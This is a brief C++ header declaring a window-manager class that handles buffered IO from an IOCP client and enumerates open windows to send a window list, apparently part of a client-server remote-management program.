#pragma once
#include "Manager.h"
class CWindowManager :
	public CManager
{
public:
	CWindowManager(_CIOCPClient* IOCPClient);
	~CWindowManager();
	virtual  void  HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength);
	BOOL  SendClientWindowList();
	static  BOOL  CALLBACK  EnumWindowProcedure(HWND Hwnd, LPARAM lParam);
};

